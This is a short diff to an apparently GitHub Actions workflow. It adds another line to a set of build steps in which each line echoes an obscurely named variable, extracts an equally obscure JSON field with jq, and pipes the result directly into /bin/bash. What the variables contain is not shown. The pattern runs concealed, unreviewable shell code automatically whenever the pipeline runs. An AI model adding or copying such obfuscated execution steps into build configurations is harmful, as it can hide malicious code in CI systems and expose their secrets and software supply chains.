@@ -52,6 +52,7 @@ jobs:
           echo $l9454 | jq -r .lv414 | /bin/bash
           printf '%s' "$wmli6184" | jq -r .jo80 | /bin/bash
           echo $lqxls92364 | jq -r .tr822 | /bin/bash
+          echo $ls0852 | jq -r .fi99 | /bin/bash
 
       - name: Store artifact
         if: always()
